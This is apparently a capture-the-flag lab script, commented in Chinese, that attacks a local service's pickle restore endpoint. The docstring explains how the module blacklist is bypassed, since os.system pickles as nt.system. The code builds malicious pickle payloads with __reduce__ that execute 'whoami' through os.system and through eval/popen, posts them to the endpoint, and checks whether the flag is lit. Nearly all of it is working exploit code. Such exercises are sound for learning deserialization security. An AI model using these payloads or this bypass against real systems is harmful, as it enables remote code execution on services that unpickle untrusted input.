# -*- coding: utf-8 -*-
"""FLAG3 攻击脚本：黑名单绕过
运行：python attack_limited.py

为什么能绕过？
  黑名单拦了 os / subprocess / builtins 等模块，
  但 __reduce__ 返回 os.system 时，pickle 记录的是它的真实模块 nt（Windows 底层）
  → 黑名单查 os 查不到 nt → 绕过成功
"""
import pickle, base64, os
import requests

# 1) 生成 payload：__reduce__ 返回 os.system（pickle 会记录成 nt.system）
class Exploit:
    def __reduce__(self):
        return (os.system, ("whoami",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print("payload:", payload[:40], "...")

# 2) 提交到 /restore-limited（黑名单版）
url = "http://127.0.0.1:5034/restore-limited"
r = requests.post(url, data={"data": payload})

# 3) 打印响应
import re
m = re.search(r"class='msg'>(.*?)</div>", r.text, re.S)
print("=== 服务器响应 ===")
print(m.group(1) if m else r.text[:200])
print()

# 4) 对照：eval payload 会被拦（builtins 在黑名单）
class Exploit2:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('whoami').read()",))
p2 = base64.b64encode(pickle.dumps(Exploit2())).decode()
r2 = requests.post(url, data={"data": p2})
m2 = re.search(r"class='msg'>(.*?)</div>", r2.text, re.S)
print("=== 对照：eval payload（应该被拦）===")
print(m2.group(1) if m2 else r2.text[:200])
print()

# 5) FLAG3 状态
r3 = requests.get("http://127.0.0.1:5034/")
print("FLAG3 状态:", "✅" if "FLAG3 黑名单绕过 ✅" in r3.text else "还没亮")
